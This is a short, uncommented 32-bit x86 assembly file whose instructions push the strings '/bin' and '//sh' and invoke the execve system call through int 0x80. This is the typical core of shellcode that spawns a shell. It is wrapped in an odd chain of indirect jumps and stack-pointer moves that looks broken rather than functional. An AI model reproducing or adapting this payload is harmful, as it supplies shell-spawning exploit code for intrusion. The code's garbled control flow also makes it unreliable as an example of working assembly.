section .text
global start
global main

start:
main:
push   ebp
mov    ebp, esp
lea    ecx, [edx + 4]
add    edx, 12
jmp    edx
push   0
jmp    ecx
push   0x68732f2f
jmp    ecx
push   0x6e69622f
jmp    ecx
mov    esp, ebx
push   0
push   ebx
jmp    ecx
mov    esp, ecx
mov    al, 0xb
jmp    ecx
int    0x80
ret
leave